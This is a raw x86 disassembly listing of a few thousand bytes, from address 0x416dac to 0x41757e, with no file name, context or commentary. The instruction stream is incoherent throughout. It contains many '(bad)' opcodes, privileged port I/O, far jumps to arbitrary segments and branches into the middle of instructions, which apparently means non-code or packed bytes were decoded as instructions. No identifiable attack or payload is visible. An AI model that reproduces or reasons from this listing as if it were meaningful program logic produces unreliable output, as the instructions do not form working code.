  416dac:	aaa    
  416dad:	fsub   DWORD PTR [edi-0x633f52c5]
  416db3:	inc    esi
  416db4:	sbb    DWORD PTR fs:[ebx-0x1c4d7b95],ebp
  416dbb:	xchg   BYTE PTR [eax],al
  416dbd:	and    al,0x5e
  416dbf:	jnp    0x416e31
  416dc1:	mul    DWORD PTR [edx-0x5cbb2829]
  416dc7:	push   edi
  416dc8:	(bad)  
  416dc9:	dec    esi
  416dca:	sbb    al,0xca
  416dcc:	neg    DWORD PTR [ebx-0x6c]
  416dcf:	add    ah,dh
  416dd1:	xchg   DWORD PTR [edx+edi*4],ebp
  416dd4:	xchg   ecx,eax
  416dd5:	mov    ebx,0x22f718a4
  416dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ddb:	int3   
  416ddc:	es mov eax,0x89611cf7
  416de2:	mov    dh,0x0
  416de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416de5:	out    dx,eax
  416de6:	fcom   DWORD PTR [esi+0xab09c0a]
  416dec:	jno    0x416e1e
  416dee:	jns    0x416dae
  416df0:	inc    edx
  416df1:	xchg   ebx,eax
  416df2:	daa    
  416df3:	push   ds
  416df4:	and    ebp,DWORD PTR [edx+0x77ebbd9]
  416dfa:	test   BYTE PTR [edi+0x55],dh
  416dfd:	push   esp
  416dfe:	ds out 0xa8,al
  416e01:	retf   
  416e02:	or     edx,esi
  416e04:	mov    ch,0x74
  416e06:	lahf   
  416e07:	cli    
  416e08:	push   esp
  416e09:	out    dx,eax
  416e0a:	xchg   edx,eax
  416e0b:	ins    BYTE PTR es:[edi],dx
  416e0c:	jl     0x416dbd
  416e0e:	fisub  DWORD PTR [edi-0x6238c9e1]
  416e14:	add    eax,0xcf521e2
  416e19:	adc    al,bl
  416e1b:	jmp    FWORD PTR [edi]
  416e1d:	lea    eax,[edi]
  416e1f:	mov    esp,es
  416e21:	nop
  416e22:	jmp    0x416e1d
  416e24:	xor    dl,BYTE PTR [edx]
  416e26:	lds    ecx,FWORD PTR [edi+0x75]
  416e29:	int3   
  416e2a:	jae    0x416e1b
  416e2c:	dec    ebp
  416e2d:	je     0x416db2
  416e2f:	int3   
  416e30:	lock push esi
  416e32:	dec    esi
  416e33:	xor    esi,edi
  416e35:	add    eax,0x1d1e647d
  416e3a:	mov    ch,0xd3
  416e3c:	aaa    
  416e3d:	jmp    0xfb5:0x6e3780cc
  416e44:	mov    cl,0xa0
  416e46:	push   edx
  416e47:	call   ebx
  416e49:	in     eax,0x16
  416e4b:	lahf   
  416e4c:	push   edi
  416e4d:	jecxz  0x416dfb
  416e4f:	in     al,0x1d
  416e51:	gs inc ebp
  416e53:	adc    dl,al
  416e55:	push   es
  416e56:	xchg   ebx,eax
  416e57:	push   ecx
  416e58:	sbb    al,0x9b
  416e5a:	jae    0x416e8f
  416e5c:	int    0x2d
  416e5e:	mov    ah,0xc1
  416e60:	call   0xaa00:0x6f2409ab
  416e67:	push   edx
  416e68:	add    eax,0x9a53c8e4
  416e6d:	add    esi,esp
  416e6f:	push   esp
  416e70:	adc    DWORD PTR ds:0x52d28b25,ebp
  416e76:	outs   dx,DWORD PTR ds:[esi]
  416e77:	std    
  416e78:	sbb    ecx,DWORD PTR [edx]
  416e7a:	pop    ss
  416e7b:	mov    ah,0x67
  416e7d:	push   ebx
  416e7e:	repnz ror BYTE PTR [esi],0x76
  416e82:	sub    eax,0xa0b68d6
  416e87:	sbb    cl,BYTE PTR [edx-0x28]
  416e8a:	add    edx,eax
  416e8c:	mov    ch,BYTE PTR [edx-0x6996c5ca]
  416e92:	mov    edx,0x6f9db878
  416e97:	xor    dl,dl
  416e99:	or     edi,DWORD PTR [ecx]
  416e9b:	mov    al,ah
  416e9d:	rol    bl,1
  416e9f:	adc    al,0xec
  416ea1:	sbb    al,0x88
  416ea3:	jne    0x416e2a
  416ea5:	xchg   ecx,eax
  416ea6:	das    
  416ea7:	lock fsubr DWORD PTR [edx-0x28]
  416eab:	jnp    0x416ed0
  416ead:	dec    eax
  416eae:	hlt    
  416eaf:	mov    esp,0xbfb1bcba
  416eb4:	jg     0x416f21
  416eb6:	dec    esi
  416eb7:	jp     0x416f27
  416eb9:	repz test eax,0xc2193b3b
  416ebf:	fiadd  DWORD PTR [eax-0x41]
  416ec2:	or     DWORD PTR [esi+0x138a1a2f],0xef773a74
  416ecc:	xchg   edi,eax
  416ecd:	lea    ebx,[edi]
  416ecf:	xor    eax,0xc9c868e5
  416ed4:	call   0xd12f60b2
  416ed9:	out    dx,al
  416eda:	out    dx,eax
  416edb:	sbb    dh,BYTE PTR [edi+0x36bf0258]
  416ee1:	jg     0x416eaf
  416ee3:	and    bh,BYTE PTR [eax+ebx*8+0x4f8795dc]
  416eea:	dec    DWORD PTR [edi+eiz*4+0x46]
  416eee:	add    edi,edx
  416ef0:	mov    ebp,0xdc7e10b2
  416ef5:	dec    BYTE PTR [edx-0x2d]
  416ef8:	cdq    
  416ef9:	jg     0x416ebb
  416efb:	retf   
  416efc:	add    DWORD PTR [esi],0x4
  416eff:	lods   eax,DWORD PTR ds:[esi]
  416f00:	sub    dl,cl
  416f02:	mov    dl,0xe7
  416f04:	cmovl  ebp,DWORD PTR [edi]
  416f07:	cld    
  416f08:	inc    eax
  416f09:	push   es
  416f0a:	loopne 0x416f2f
  416f0c:	outs   dx,DWORD PTR ds:[esi]
  416f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f0e:	test   edx,ebp
  416f10:	xor    DWORD PTR [esi+0x50ea4e6f],ebx
  416f16:	push   cs
  416f17:	test   DWORD PTR ds:0x6b18dd7a,eax
  416f1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f1e:	jnp    0x416f04
  416f20:	mov    al,0x6f
  416f22:	in     eax,dx
  416f23:	xlat   BYTE PTR ds:[ebx]
  416f24:	inc    edx
  416f25:	test   eax,0x1a9c2e92
  416f2a:	call   0x9ce56b7a
  416f2f:	mov    WORD PTR [edx],ss
  416f31:	cmp    DWORD PTR [edi-0x2c],0xffffffec
  416f35:	mov    ecx,0x5b8b2d6
  416f3a:	das    
  416f3b:	push   eax
  416f3c:	leave  
  416f3d:	lock push 0xd12e0fb1
  416f43:	sti    
  416f44:	push   es
  416f45:	loopne 0x416edb
  416f47:	retf   0xc04
  416f4a:	xor    al,0xd5
  416f4c:	ja     0x416fb2
  416f4e:	aas    
  416f4f:	pop    ebx
  416f50:	push   0x431b0733
  416f55:	mov    eax,DWORD PTR [ebx+ecx*2-0x21]
  416f59:	out    0xaf,eax
  416f5b:	leave  
  416f5c:	mov    dl,0x85
  416f5e:	lods   al,BYTE PTR ds:[esi]
  416f5f:	xor    ah,ch
  416f61:	call   0xc7c8:0xfdaf5246
  416f68:	inc    ebx
  416f69:	in     al,dx
  416f6a:	ins    BYTE PTR es:[edi],dx
  416f6b:	stc    
  416f6c:	and    esp,ebx
  416f6e:	(bad)  
  416f70:	pop    edi
  416f71:	fisub  DWORD PTR [esi-0x2c94e214]
  416f77:	dec    ecx
  416f78:	push   es
  416f79:	or     ah,BYTE PTR [eax-0x667c5b2c]
  416f7f:	rol    DWORD PTR [edx+0x7ab7400d],1
  416f85:	inc    ebx
  416f86:	fdiv   QWORD PTR [ebx+ebp*1-0x77]
  416f8a:	pop    ebx
  416f8b:	jecxz  0x416fea
  416f8d:	pop    es
  416f8e:	mov    ds:0x398ad49c,eax
  416f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f94:	sub    DWORD PTR [edx-0x744e1261],ebx
  416f9a:	mov    ch,0x40
  416f9c:	jno    0x416f81
  416f9e:	ret    0xe188
  416fa1:	sbb    edx,ecx
  416fa3:	imul   esi,DWORD PTR [ecx+0x43],0x5930a319
  416faa:	and    BYTE PTR [ecx],bh
  416fac:	es cdq 
  416fae:	sub    al,0xb
  416fb0:	cmp    dl,cl
  416fb2:	mov    eax,DWORD PTR [esi+0x34]
  416fb5:	mov    dh,0xf6
  416fb7:	jo     0x416f54
  416fb9:	enter  0xc2dd,0x34
  416fbd:	arpl   WORD PTR gs:[esi-0x6c],dx
  416fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fc2:	inc    edi
  416fc3:	add    DWORD PTR [esi+ebx*8-0x1a],ebp
  416fc7:	sub    BYTE PTR [edx+0x1ee4516f],cl
  416fcd:	fdiv   st,st(0)
  416fcf:	fstp   QWORD PTR [ecx]
  416fd1:	fwait
  416fd2:	(bad)  
  416fd3:	aad    0xb5
  416fd5:	or     eax,0xa5271a0d
  416fda:	clc    
  416fdb:	scas   al,BYTE PTR es:[edi]
  416fdc:	sti    
  416fdd:	sub    cl,cl
  416fdf:	cli    
  416fe0:	icebp  
  416fe1:	or     BYTE PTR [eax+0x55],ah
  416fe4:	shl    bl,0x65
  416fe7:	out    0xeb,eax
  416fe9:	push   ebx
  416fea:	xchg   DWORD PTR [esp+ecx*1+0x30e83a7],ebx
  416ff1:	les    ebx,FWORD PTR [ebx+eiz*1+0x44604c2]
  416ff8:	xchg   ebp,eax
  416ff9:	mov    edi,0x31f1af88
  416ffe:	dec    ecx
  416fff:	stos   DWORD PTR es:[edi],eax
  417000:	retf   
  417001:	loopne 0x41703b
  417003:	retf   
  417004:	cmp    BYTE PTR [ebp+0x2b],cl
  417007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417008:	or     DWORD PTR [ebp-0x3e],edx
  41700b:	stos   BYTE PTR es:[edi],al
  41700c:	mov    al,ds:0x3d941985
  417011:	scas   eax,DWORD PTR es:[edi]
  417012:	push   cs
  417013:	out    0x94,al
  417015:	sbb    DWORD PTR [esi*2+0x3333b003],esp
  41701c:	fld    TBYTE PTR [eax-0x38]
  41701f:	xchg   esi,eax
  417020:	adc    ch,BYTE PTR [edi]
  417022:	xor    dl,BYTE PTR [ecx]
  417024:	adc    BYTE PTR [ebp+0x7a],dl
  417027:	inc    ecx
  417028:	mov    ah,0x4e
  41702a:	in     al,0x40
  41702c:	loop   0x416ff4
  41702e:	mov    ds:0xf9813eee,al
  417033:	std    
  417034:	mov    dl,0x26
  417036:	stc    
  417037:	mov    eax,0x792e272e
  41703c:	leave  
  41703d:	outs   dx,DWORD PTR ds:[esi]
  41703e:	xchg   ebx,eax
  41703f:	dec    ebp
  417040:	aam    0xb3
  417042:	xchg   edi,esi
  417044:	out    0xe3,ax
  417047:	xor    bh,BYTE PTR [ebp+0x73]
  41704a:	or     esi,DWORD PTR [ebp+0x24]
  41704d:	in     al,0x7c
  41704f:	sahf   
  417050:	inc    esp
  417051:	iret   
  417052:	jnp    0x416fdd
  417054:	loop   0x416fec
  417056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417057:	mov    dh,BYTE PTR [esi]
  417059:	shr    eax,1
  41705b:	jmp    0x906f566
  417060:	sub    BYTE PTR [ecx],dh
  417062:	popa   
  417063:	sub    al,0xa7
  417065:	imul   ecx,DWORD PTR [ebx+0x42],0x1d
  417069:	out    dx,eax
  41706a:	add    bl,bl
  41706c:	scas   al,BYTE PTR es:[edi]
  41706d:	add    DWORD PTR [ebp+ecx*1-0x1],ebx
  417071:	push   ds
  417072:	sbb    bh,ch
  417074:	(bad)  
  417075:	test   eax,0xb08bdf14
  41707a:	inc    esp
  41707b:	loopne 0x4170fa
  41707d:	adc    dl,BYTE PTR [ebp+0x1f]
  417080:	std    
  417081:	fdiv   DWORD PTR [esi+0x5835d589]
  417087:	push   edi
  417088:	out    0x44,al
  41708a:	repnz xor eax,0xdc2553db
  417090:	lock test al,0x91
  417093:	jmp    0x96d28a78
  417098:	rcl    esp,0x40
  41709b:	ins    BYTE PTR es:[edi],dx
  41709c:	sbb    edi,DWORD PTR [esi+0x211b3d5c]
  4170a2:	push   cs
  4170a3:	ficom  WORD PTR [ebx+0x62]
  4170a6:	aad    0x35
  4170a8:	push   ebp
  4170a9:	daa    
  4170aa:	or     eax,0x8b7f3b2c
  4170af:	mov    dl,0xe1
  4170b1:	sar    BYTE PTR [ebp-0x7c],cl
  4170b4:	jb     0x4170cd
  4170b6:	xlat   BYTE PTR gs:[ebx]
  4170b8:	xchg   esp,eax
  4170b9:	shl    DWORD PTR [ecx+0x4a],0x53
  4170bd:	mov    BYTE PTR [eax],dh
  4170bf:	inc    eax
  4170c0:	mov    eax,0x643c358
  4170c5:	into   
  4170c6:	cmp    eax,0x4e9fc619
  4170cb:	xor    ebx,DWORD PTR [ecx-0x56]
  4170ce:	jg     0x41708b
  4170d0:	adc    BYTE PTR [ecx-0x2682ea26],0x25
  4170d7:	pop    ecx
  4170d8:	mov    edi,0xf2939e1b
  4170dd:	cmp    ecx,DWORD PTR [eax-0x50]
  4170e0:	mov    al,ds:0xe1fc1cf7
  4170e5:	cmp    edi,DWORD PTR [edx-0x3eb56398]
  4170eb:	mov    dl,0x1c
  4170ed:	ss mov ebp,0x8821ea4f
  4170f3:	aaa    
  4170f4:	rcr    BYTE PTR [edx],1
  4170f6:	push   cs
  4170f7:	aas    
  4170f8:	in     al,dx
  4170f9:	or     DWORD PTR [edi],0x9fffe988
  4170ff:	in     al,0x9e
  417101:	add    al,0x98
  417103:	je     0x41708d
  417105:	enter  0x179,0x94
  417109:	loope  0x41714c
  41710b:	arpl   WORD PTR [edx],cx
  41710d:	daa    
  41710e:	cmp    eax,0x6fcb5004
  417113:	adc    esi,DWORD PTR [edx]
  417115:	add    eax,DWORD PTR [ecx-0x1f4d193f]
  41711b:	push   edx
  41711c:	pop    ecx
  41711d:	add    ecx,ebp
  41711f:	lods   al,BYTE PTR ds:[esi]
  417120:	sahf   
  417121:	mov    eax,0xe1e6d149
  417126:	enter  0x7ea8,0xd2
  41712a:	ret    0x9a94
  41712d:	cmp    ah,dl
  41712f:	ja     0x417123
  417131:	call   0x7184:0x59d94e35
  417138:	repz int3 
  41713a:	ficom  WORD PTR ds:0xa591429e
  417140:	call   0x36c4:0x26d565c
  417147:	out    dx,eax
  417148:	mov    ebx,0xdb9a107c
  41714d:	cmp    al,0xaf
  41714f:	sub    DWORD PTR [edi+0x22],ebp
  417152:	outs   dx,BYTE PTR ds:[esi]
  417153:	(bad)  
  417154:	mov    esp,0x226e1782
  417159:	sbb    BYTE PTR [ecx-0x4154f25c],dl
  41715f:	mov    BYTE PTR [edx+0xa],cl
  417162:	xchg   ebp,eax
  417163:	jo     0x41715f
  417165:	fiadd  DWORD PTR [esi+0x405cfc5a]
  41716b:	jmp    0x1f7db77e
  417170:	push   esi
  417171:	mov    eax,edi
  417173:	xchg   esp,eax
  417174:	mov    WORD PTR [eax-0x6167f185],?
  41717a:	aas    
  41717b:	leave  
  41717c:	lods   al,BYTE PTR ds:[esi]
  41717d:	cmp    cl,BYTE PTR ds:0x15fb3650
  417183:	daa    
  417184:	jmp    0x613d1af1
  417189:	out    dx,al
  41718a:	fs fs data16 loope 0x4171d5
  41718f:	or     edx,0xffffffc3
  417192:	push   edx
  417193:	jae    0x41718c
  417195:	repz gs aad 0x93
  417199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41719a:	push   ss
  41719b:	mov    ebp,0x36c8e25b
  4171a0:	sbb    esp,esp
  4171a2:	push   ss
  4171a3:	sub    ebx,esp
  4171a5:	in     eax,0xc2
  4171a7:	repnz sub edi,DWORD PTR [edx+0x67a85b7d]
  4171ae:	lds    edx,FWORD PTR [eax]
  4171b0:	mov    ch,0xcb
  4171b2:	xchg   ax,ax
  4171b4:	scas   al,BYTE PTR es:[edi]
  4171b5:	cmp    bl,cl
  4171b7:	jg     0x4171dc
  4171b9:	or     ecx,DWORD PTR [edx]
  4171bb:	ss xor eax,0x9698b028
  4171c1:	scas   eax,DWORD PTR es:[edi]
  4171c2:	inc    ebp
  4171c3:	rcr    BYTE PTR [esi+0x40],1
  4171c6:	mov    ebx,0xc023872b
  4171cb:	sub    dh,BYTE PTR [eax]
  4171cd:	cmp    BYTE PTR [edi+ebx*1-0x54],cl
  4171d1:	lahf   
  4171d2:	pop    eax
  4171d3:	dec    ebp
  4171d4:	or     al,0x34
  4171d6:	jo     0x4171eb
  4171d8:	js     0x417214
  4171da:	sbb    DWORD PTR [edx-0x2b8da6f7],ebx
  4171e0:	ror    DWORD PTR [edi+ecx*1-0x44],cl
  4171e4:	aas    
  4171e5:	scas   eax,DWORD PTR es:[edi]
  4171e6:	xchg   BYTE PTR [ebx],ah
  4171e8:	lds    esi,FWORD PTR [edi+0x62]
  4171eb:	xchg   DWORD PTR [edx],ebp
  4171ed:	sbb    BYTE PTR [edi-0x121a3805],0x14
  4171f4:	aam    0x3
  4171f6:	test   DWORD PTR [eax+eiz*2],esi
  4171f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171fa:	addr16 mov ecx,0xc68bdf0f
  417200:	das    
  417201:	push   edx
  417202:	cdq    
  417203:	ins    DWORD PTR es:[edi],dx
  417204:	jno    0x417187
  417206:	test   al,0xbd
  417208:	jns    0x417194
  41720a:	adc    cl,0x31
  41720d:	dec    ecx
  41720e:	shl    BYTE PTR [esi-0x2ca808fe],0x30
  417215:	mov    eax,DWORD PTR [ebp+eax*4-0x1e9a314a]
  41721c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41721d:	gs ins BYTE PTR es:[edi],dx
  41721f:	mov    ecx,0x979076dd
  417224:	scas   al,BYTE PTR es:[edi]
  417225:	int    0xa8
  417227:	ret    0x70d8
  41722a:	inc    esi
  41722b:	aas    
  41722c:	push   0xe97eade2
  417231:	xchg   ebx,eax
  417232:	dec    ebp
  417233:	push   0x382a80fa
  417238:	and    ah,al
  41723a:	shr    cl,cl
  41723c:	call   0x967477c0
  417241:	push   ecx
  417242:	adc    BYTE PTR [eax-0x7246f3a7],0x92
  417249:	cs jle 0x417286
  41724c:	sbb    BYTE PTR [ebp-0x418898fa],cl
  417252:	(bad)  
  417253:	inc    di
  417255:	push   0xffffffea
  417257:	mov    ds:0xbd06f453,eax
  41725c:	fs add al,0x20
  41725f:	pop    edi
  417260:	pop    esp
  417261:	mov    ds:0x76e74937,eax
  417266:	jns    0x4171ee
  417268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417269:	xor    edx,esi
  41726b:	cli    
  41726c:	js     0x417278
  41726e:	ss inc esi
  417270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417271:	jmp    0x9d04:0x570246b0
  417278:	push   ds
  417279:	xchg   ebx,eax
  41727a:	mov    dh,0xa1
  41727c:	inc    dl
  41727e:	adc    al,0xd9
  417280:	xor    eax,0xaa00ac91
  417285:	jnp    0x41723a
  417287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417288:	dec    esi
  417289:	in     al,0xcf
  41728b:	mov    bl,0xa6
  41728d:	cmp    BYTE PTR [ecx-0x4225f327],ch
  417293:	sub    eax,0x146c0ecb
  417298:	test   DWORD PTR [ebx-0x78],esp
  41729b:	imul   DWORD PTR [edx+eiz*1+0x23]
  41729f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172a0:	mov    edi,0x484c9cf
  4172a5:	jl     0x41728b
  4172a7:	push   esi
  4172a8:	scas   al,BYTE PTR es:[edi]
  4172a9:	dec    edi
  4172aa:	sub    al,0x59
  4172ac:	aad    0x7
  4172ae:	ins    BYTE PTR es:[edi],dx
  4172af:	addr16 inc ebp
  4172b1:	mov    es,ebp
  4172b3:	cmp    eax,0x4b095697
  4172b8:	aaa    
  4172b9:	not    dl
  4172bb:	xchg   ebp,eax
  4172bc:	cmp    DWORD PTR [edi+0x63],esp
  4172bf:	cs mov bh,0xb9
  4172c2:	call   0x101e3060
  4172c7:	and    eax,0xded1f40
  4172cc:	dec    edi
  4172cd:	dec    esp
  4172ce:	mov    eax,ds:0xce3e19b3
  4172d3:	enter  0x7fda,0x82
  4172d7:	aad    0xe2
  4172d9:	mov    ah,0x19
  4172db:	mov    esi,0x14e2be52
  4172e0:	sar    BYTE PTR [edi-0x5b],1
  4172e3:	cmp    BYTE PTR [ebp-0x2c],al
  4172e6:	rcr    BYTE PTR [edx],cl
  4172e8:	clc    
  4172e9:	jns    0x417348
  4172eb:	out    0xed,eax
  4172ed:	xchg   ebx,eax
  4172ee:	xchg   BYTE PTR [eax+0x4ede64b],dl
  4172f4:	jp     0x4172c6
  4172f6:	fmul   QWORD PTR [esi+0x54]
  4172f9:	or     ah,ch
  4172fb:	loopne 0x417288
  4172fd:	cmp    ch,BYTE PTR [ebx+0x56357287]
  417303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417304:	push   esi
  417305:	das    
  417306:	inc    edx
  417307:	sbb    eax,0xdabe1885
  41730c:	ss loope 0x4172f8
  41730f:	aad    0xb5
  417311:	mov    gs,WORD PTR [ecx]
  417313:	fnsave [ebp+ebp*2-0x7]
  417317:	ror    DWORD PTR [edi-0x66],cl
  41731a:	nop    DWORD PTR [ecx]
  41731d:	sahf   
  41731e:	add    BYTE PTR [ecx-0x10e1b113],bh
  417324:	pop    ss
  417325:	idiv   BYTE PTR [esi+0x7e]
  417328:	mov    edx,0xe7790053
  41732d:	lods   al,BYTE PTR ds:[esi]
  41732e:	ficom  DWORD PTR [edx-0x60]
  417331:	mov    al,ds:0x5c8345b8
  417336:	call   0xd8d9:0x49826f6a
  41733d:	(bad)  
  41733e:	scas   eax,DWORD PTR es:[edi]
  41733f:	repnz xor edi,DWORD PTR [ebx+0xbdd8f]
  417346:	xchg   BYTE PTR [ebx+0xfaf17eb],cl
  41734c:	jnp    0x4173c8
  41734e:	lahf   
  41734f:	cmp    esi,ebx
  417351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417352:	add    BYTE PTR ds:0x5504c8fd,dl
  417358:	jne    0x417378
  41735a:	cli    
  41735b:	cwde   
  41735c:	or     al,BYTE PTR [edx-0x4ecae190]
  417362:	aas    
  417363:	mov    ecx,0x56726bf4
  417368:	jmp    0xaf3d385c
  41736d:	pop    edi
  41736e:	popa   
  41736f:	pop    ss
  417370:	sbb    esp,ecx
  417372:	xchg   ebx,eax
  417373:	ret    0x9b60
  417376:	out    0xf9,eax
  417378:	or     DWORD PTR ds:0x74c9feb7,0x4fbf7b65
  417382:	addr16 (bad) 
  417384:	jmp    DWORD PTR [edi+0x45d67169]
  41738a:	push   0x5bf28e77
  41738f:	shl    BYTE PTR ds:[ecx+0x2c],1
  417393:	jmp    0xc130:0xe4da77f0
  41739a:	push   ebx
  41739b:	jno    0x41738e
  41739d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41739e:	or     bl,ch
  4173a0:	bound  esi,QWORD PTR [edi+0x44ff293c]
  4173a6:	add    DWORD PTR [ebp-0x2f4b94b1],ebp
  4173ac:	test   eax,0x495b2f9e
  4173b1:	or     al,0x22
  4173b3:	out    dx,al
  4173b4:	and    dl,0x38
  4173b7:	xor    BYTE PTR [esi-0x38],cl
  4173ba:	inc    ebp
  4173bb:	rcr    DWORD PTR [edx-0x6ebef578],cl
  4173c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173c2:	sahf   
  4173c3:	fcom   QWORD PTR [esi-0x6e]
  4173c6:	lahf   
  4173c7:	push   ecx
  4173c8:	jp     0x417446
  4173ca:	ret    
  4173cb:	mov    esi,0xc93ae337
  4173d0:	pop    esp
  4173d1:	or     BYTE PTR [edi+ecx*1+0x6d],al
  4173d5:	xchg   BYTE PTR [esi-0x2f48f61f],bl
  4173db:	adc    eax,0x826eced7
  4173e0:	jmp    0x5f71:0xd97f2a00
  4173e7:	mov    bl,0xa1
  4173e9:	mov    eax,0x2b38eac9
  4173ee:	cmp    DWORD PTR ds:0x10fbfcec,edi
  4173f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f5:	ins    BYTE PTR es:[edi],dx
  4173f6:	xor    al,0x0
  4173f8:	es cwde 
  4173fa:	nop
  4173fb:	pop    eax
  4173fc:	shl    eax,0x8e
  4173ff:	or     ebp,0x329c7d68
  417405:	mov    DWORD PTR [ebp-0x1ed348],eax
  41740b:	rcl    DWORD PTR [ebp+0x19],0x22
  41740f:	mov    dh,0x32
  417411:	jne    0x41748a
  417413:	out    0xe3,eax
  417415:	inc    eax
  417416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417417:	ins    BYTE PTR es:[edi],dx
  417418:	mov    dh,0x74
  41741a:	addr16 mov eax,0x2051c626
  417420:	popf   
  417421:	stos   BYTE PTR es:[edi],al
  417422:	xchg   ebp,eax
  417423:	mov    ebx,0xeb2f91c
  417428:	xor    eax,0x65eb0e83
  41742d:	push   ebx
  41742e:	push   0xee8e3a0b
  417433:	aas    
  417434:	repnz xchg esp,eax
  417436:	iret   
  417437:	(bad)  
  417438:	call   FWORD PTR [eiz*8+0x1b32793a]
  41743f:	jecxz  0x41748d
  417441:	add    DWORD PTR [ecx],edx
  417443:	mov    ds:0x570e3554,eax
  417448:	pop    ebx
  417449:	push   ebx
  41744a:	fisttp DWORD PTR [edi+0x64]
  41744d:	pop    edx
  41744e:	je     0x41748b
  417450:	dec    edx
  417451:	inc    ebp
  417452:	pop    ss
  417453:	and    ecx,DWORD PTR [edx+0x36]
  417456:	cld    
  417457:	or     BYTE PTR [ebp+0x34b47857],0x7c
  41745e:	retf   
  41745f:	jno    0x417439
  417461:	dec    ebp
  417462:	gs mov cl,0xfd
  417465:	inc    ebp
  417466:	retf   
  417467:	jl     0x4173fe
  417469:	jecxz  0x4174a2
  41746b:	mov    BYTE PTR [edx+0x57],bh
  41746e:	push   edi
  41746f:	in     eax,dx
  417470:	iret   
  417471:	daa    
  417472:	dec    ebx
  417473:	pop    ebx
  417474:	xchg   esp,eax
  417475:	scas   al,BYTE PTR es:[edi]
  417476:	push   edx
  417477:	mov    al,dl
  417479:	ins    DWORD PTR es:[edi],dx
  41747a:	mov    al,ds:0xd381aff0
  41747f:	push   0xc2c86a1c
  417484:	push   ebx
  417485:	hlt    
  417486:	xchg   ebx,eax
  417487:	adc    ebp,DWORD PTR [ebp-0x56e4401]
  41748d:	int3   
  41748e:	cmc    
  41748f:	add    BYTE PTR [eax+0x6f],dh
  417492:	imul   ebp,edx,0x6f
  417495:	dec    ecx
  417496:	inc    edx
  417497:	dec    ebx
  417498:	mov    bh,0x63
  41749a:	frstor [edx+0x53]
  41749d:	lea    ecx,[edi-0x719599d1]
  4174a3:	clc    
  4174a4:	mov    BYTE PTR [esp+ebx*8],ah
  4174a7:	shl    ebp,1
  4174a9:	jno    0x4174d7
  4174ab:	ja     0x417483
  4174ad:	mov    ?,WORD PTR [edx+0x51573b76]
  4174b3:	xor    al,0xe7
  4174b5:	mov    ebx,0x250ba165
  4174ba:	sub    dl,BYTE PTR [edx]
  4174bc:	mov    esi,ebp
  4174be:	fucom  st(0)
  4174c0:	shl    cl,cl
  4174c2:	or     eax,DWORD PTR [edx]
  4174c4:	sbb    BYTE PTR [ebp+0x21],bh
  4174c7:	jmp    0x57dbd6cf
  4174cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174cd:	xchg   bl,cl
  4174cf:	dec    esp
  4174d0:	in     al,dx
  4174d1:	adc    bh,0xf7
  4174d4:	jno    0x417550
  4174d6:	adc    edi,DWORD PTR [edi-0x8dcd2bb]
  4174dc:	dec    eax
  4174dd:	sbb    DWORD PTR ds:0xe197e70e,edi
  4174e3:	es lahf 
  4174e5:	shr    BYTE PTR [eax+0x15d02188],1
  4174eb:	(bad)  
  4174ec:	call   0x983951a9
  4174f1:	sbb    DWORD PTR [ecx-0x11],edx
  4174f4:	mov    dl,0xb6
  4174f6:	pop    esi
  4174f7:	fucomip st,st(7)
  4174f9:	fnstcw WORD PTR [eax-0x14399793]
  4174ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417500:	mov    fs,WORD PTR [ebx]
  417502:	test   eax,0xad7fb0b3
  417507:	cmp    BYTE PTR [esi],dl
  417509:	jmp    0xfaeb3134
  41750e:	not    DWORD PTR [ecx]
  417510:	sbb    BYTE PTR [eax+esi*4+0xd],bl
  417514:	and    BYTE PTR [edi],bl
  417516:	and    al,0x7b
  417518:	stos   BYTE PTR es:[edi],al
  417519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41751a:	add    bh,BYTE PTR [esi]
  41751c:	shl    DWORD PTR [eax-0x61],1
  41751f:	rcl    DWORD PTR [eax+0x54451059],0x2b
  417526:	ja     0x4175a0
  417528:	mov    esi,0xc6283638
  41752d:	stos   DWORD PTR es:[edi],eax
  41752e:	xor    DWORD PTR [edi-0x78d554cd],edx
  417534:	cmp    eax,esp
  417536:	cmp    dl,ah
  417538:	cmp    eax,DWORD PTR [esi]
  41753a:	sbb    ebp,DWORD PTR [edx]
  41753c:	xchg   edx,eax
  41753d:	(bad)  
  41753e:	retf   
  41753f:	mov    eax,ds:0xf60763e9
  417544:	(bad)  
  417545:	mov    ss,esi
  417547:	inc    esp
  417548:	retf   0xc988
  41754b:	into   
  41754c:	xor    DWORD PTR [edi+0x4f457780],ebx
  417552:	pmaxsw mm3,mm0
  417555:	pop    ss
  417556:	fidiv  DWORD PTR [ecx-0x11f8fe69]
  41755c:	mov    eax,ds:0xc23d20e2
  417561:	lock xrelease or DWORD PTR [ebx],edx
  417565:	sbb    eax,0xf22a2020
  41756a:	sub    eax,0xf3296f76
  41756f:	and    eax,0x9869ae40
  417574:	dec    edi
  417575:	into   
  417576:	push   edx
  417577:	(bad)  
  417578:	xor    esp,ebp
  41757a:	ja     0x41752c
  41757c:	xchg   ecx,eax
  41757d:	xlat   BYTE PTR ds:[ebx]
  41757e:	(bad)  [eax-0x15]
